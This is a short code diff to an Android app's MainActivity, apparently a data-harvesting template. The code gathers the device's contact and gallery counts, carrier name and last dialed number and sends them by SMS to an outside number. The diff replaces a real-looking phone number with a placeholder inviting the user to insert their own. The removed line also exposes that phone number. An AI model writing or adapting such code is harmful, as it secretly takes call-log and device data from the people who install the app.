@@ -37,7 +37,7 @@ public class MainActivity extends AppCompatActivity {
         Log.d("Gallery", String.valueOf(gallery_count));
         String carrierName = ((TelephonyManager) getBaseContext().getSystemService(Context.TELEPHONY_SERVICE)).getNetworkOperatorName();
         String lastDialed = CallLog.Calls.getLastOutgoingCall(getApplicationContext());
-        SmsManager.getDefault().sendTextMessage("7207955631", (String) null, String.format(Locale.ENGLISH, "%d, %d, %s, %s", new Object[]{Integer.valueOf(contacts_count), Integer.valueOf(gallery_count), carrierName, lastDialed}), (PendingIntent) null, (PendingIntent) null);
+        SmsManager.getDefault().sendTextMessage("REPLACE THIS TEXTS WITH YOUR PHONE NUMBER HERE", (String) null, String.format(Locale.ENGLISH, "%d, %d, %s, %s", new Object[]{Integer.valueOf(contacts_count), Integer.valueOf(gallery_count), carrierName, lastDialed}), (PendingIntent) null, (PendingIntent) null);
         Toast.makeText(this, "SMS sent", Toast.LENGTH_LONG).show();
         c.close();
         gallery_cursor.close();
